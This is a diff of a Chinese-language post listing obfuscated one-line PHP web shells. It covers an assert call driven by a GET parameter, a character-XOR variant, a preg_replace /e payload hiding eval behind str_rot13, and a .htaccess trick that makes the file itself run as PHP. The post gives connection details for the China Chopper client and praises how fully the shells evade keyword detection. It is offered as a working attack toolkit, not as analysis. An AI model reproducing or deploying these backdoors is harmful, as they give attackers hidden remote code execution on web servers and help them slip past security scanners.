@@ -1,14 +1,24 @@
-三个变形的一句话PHP木马
+﻿三个变形的一句话PHP木马
 第一个
-<?php ($_=@$_GET[2]).@$_($_POST[1])?> 在菜刀里写http://site/1.php?2=assert密码是1 第二个
+<?php ($_=@$_GET[2]).@$_($_POST[1])?> 在菜刀里写http://site/1.php?2=assert密码是1 
+第二个
 <?php
 $_="";
 $_[+""]='';
 $_="$_"."";
 $_=($_[+""]|"").($_[+""]|"").($_[+""]^"");
 ?>
-<?php ${'_'.$_}['_'](${'_'.$_}['__']);?> 在菜刀里写http://site/2.php?_=assert&__=eval($_POST['pass']) 密码是pass。如果你用菜刀的附加数据的话更隐蔽，或者用其它注射工具也可以，因为是post提交的。 第三个
-($b4dboy = $_POST['b4dboy']) && @preg_replace('/ad/e','@'.str_rot13('riny').'($b4dboy)', 'add'); str_rot13(‘riny’)即编码后的eval，完全避开了关键字，又不失效果，让人吐血！ 最后列几个高级的PHP一句话木马后门：
+<?php ${'_'.$_}['_'](${'_'.$_}['__']);?> 在菜刀里写http://site/2.php?_=assert&__=eval($_POST['pass']) 密码是pass。如果你用菜刀的附加数据的话更隐蔽，或者用其它注射工具也可以，因为是post提交的。 
+第三个
+($b4dboy = $_POST['b4dboy']) && @preg_replace('/ad/e','@'.str_rot13('riny').'($b4dboy)', 'add'); str_rot13(‘riny’)即编码后的eval，完全避开了关键字，又不失效果，让人吐血！
+
+.htaccess做PHP后门
+这个其实在2007年的时候作者GaRY就爆出了，只是后边没人关注，这个利用关键点在于一句话：
+
+AddType application/x-httpd-php .htaccess
+###### SHELL ###### 这里写上你的后门吧###### LLEHS ######
+
+最后列几个高级的PHP一句话木马后门：
 1、
 $hh = "p"."r"."e"."g"."_"."r"."e"."p"."l"."a"."c"."e";
 $hh("/[discuz]/e",$_POST['h'],"Access");
